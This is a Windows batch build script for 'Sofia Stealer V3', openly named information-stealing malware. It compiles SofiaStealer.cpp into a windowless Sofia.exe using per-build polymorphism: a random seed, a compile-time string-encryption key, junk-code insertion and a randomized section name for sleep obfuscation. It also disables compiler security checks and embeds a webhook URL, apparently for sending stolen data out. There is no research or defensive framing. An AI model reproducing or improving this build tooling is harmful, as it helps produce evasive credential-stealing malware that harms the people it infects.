@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo [*] Searching for Visual Studio...

set "VSPATH="
for %%E in (
    "%ProgramFiles%\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2017\Community\VC\Auxiliary\Build\vcvarsall.bat"
) do (
    if exist %%E (
        set "VSPATH=%%E"
        goto :found
    )
)

:found
if not defined VSPATH (
    echo [!] Visual Studio not found. Running cl.exe from current PATH.
) else (
    echo [V] Found VS: %VSPATH%
    call %VSPATH% x64
)

echo.
echo ══════════════════════════════════════════════════════════════
echo  Sofia Stealer V3 — Polymorphic Build
echo ══════════════════════════════════════════════════════════════

:: ── Build mode: debug or release ────────────────────────────────
:: Usage: build.bat         → release (default, no debug log)
::        build.bat debug   → debug (creates sofia_debug.log)
set "BUILD_MODE=release"
if /i "%1"=="debug" set "BUILD_MODE=debug"
echo [*] Build mode: %BUILD_MODE%

:: ── Build-time polymorphism parameters ──────────────────────────
:: POLY_SEED: random per-build entropy (changes string encryption + junk patterns)
:: JUNK_LEVEL: controls amount of NOP-equivalent junk (1=minimal, 5=heavy)
:: SLEEPSEC_NAME: randomized PE section name for sleep obfuscation code
:: OBFS_KEY: base key for compile-time string encryption

:: Generate random POLY_SEED from system entropy
set /a POLY_SEED=%RANDOM% * %RANDOM%
if %POLY_SEED% EQU 0 set /a POLY_SEED=1234567

:: Generate random OBFS_KEY (0x01-0xFF)
set /a OBFS_KEY=%RANDOM% %% 254 + 1

:: Random section name for SleepObf code segment
set "SECTIONS=.rsrc2 .reloc2 .rdata2 .tls2 .cfg2 .data2"
set /a SECIDX=%RANDOM% %% 6
set IDX=0
for %%S in (%SECTIONS%) do (
    if !IDX! EQU %SECIDX% set "SLEEPSEC=%%S"
    set /a IDX+=1
)
if not defined SLEEPSEC set "SLEEPSEC=.rsrc2"

echo [*] POLY_SEED  = %POLY_SEED%
echo [*] OBFS_KEY   = 0x%OBFS_KEY%
echo [*] SLEEPSEC   = %SLEEPSEC%
echo [*] JUNK_LEVEL = 3
echo.

set SRC=src

:: ── Source files ─────────────────────────────────────────────────
set "MAIN_SOURCE=SofiaStealer.cpp"

set "DEBUG_FLAG="
echo [*] Debug logging DISABLED (Release Only)

cl.exe ^
  /EHsc /O2 /MT /GS- /sdl- /std:c++17 ^
  /D_CRT_SECURE_NO_WARNINGS ^
  /DPOLY_SEED=%POLY_SEED% ^
  /DJUNK_LEVEL=3 ^
  /DOBFS_KEY=0x%OBFS_KEY% ^
  /DSLEEPSEC_NAME="\"%SLEEPSEC%\"" ^
  /DSOFIA_WEBHOOK_URL="\"%SOFIA_WEBHOOK_URL%\"" ^
  %DEBUG_FLAG% ^
  /FI"winsock2.h" ^
  %MAIN_SOURCE% ^
  /link ^
    /OUT:Sofia.exe ^
    /SUBSYSTEM:WINDOWS ^
    /INCREMENTAL:NO ^
    /PDB:NONE ^
    /DEFAULTLIB:libcmt.lib ^
    ws2_32.lib wlanapi.lib bcrypt.lib wininet.lib winhttp.lib crypt32.lib ^
    ncrypt.lib shell32.lib user32.lib gdi32.lib ole32.lib oleaut32.lib ^
    advapi32.lib shlwapi.lib iphlpapi.lib comctl32.lib

if %errorlevel% neq 0 (
    echo.
    echo [X] Compilation FAILED!
) else (
    echo.
    echo [V] Sofia.exe compiled successfully! (%BUILD_MODE% build)
    echo     Size: && dir Sofia.exe | findstr /i sofia.exe

    echo [*] Cleaning up .obj files...
    del /q /f *.obj >nul 2>&1
)

exit /b 0
